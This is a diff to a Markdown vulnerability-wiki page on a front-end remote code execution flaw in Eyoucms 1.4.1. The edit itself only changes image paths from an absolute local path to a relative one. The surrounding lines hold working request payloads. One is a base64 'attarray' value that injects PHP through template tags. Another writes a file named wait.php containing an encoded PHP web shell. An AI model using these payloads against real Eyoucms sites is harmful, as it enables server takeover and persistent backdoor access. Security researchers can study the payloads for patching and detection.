@@ -318,7 +318,7 @@ Eyoucms 1.4.1
 
     Payload:attarray=eyJ7cGhwfXBocGluZm8oKTt7XC9waHB9Ijoie3BocH1waHBpbmZvKCk7e1wvcGhwfSJ9&html={php}phpinfo();{/php}
 
-![](/Users/aresx/Documents/VulWiki/.resource/Eyoucms1.4.1前台rce/media/rId26.png)
+![](./.resource/Eyoucms1.4.1前台rce/media/rId26.png)
 
 Payload生成方式:
 
@@ -342,7 +342,7 @@ pyload:
 
     attarray=eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=&htmlcode=bb
 
-![](/Users/aresx/Documents/VulWiki/.resource/Eyoucms1.4.1前台rce/media/rId27.png)
+![](./.resource/Eyoucms1.4.1前台rce/media/rId27.png)
 
 htmlcode参数作为随机方式传递
 
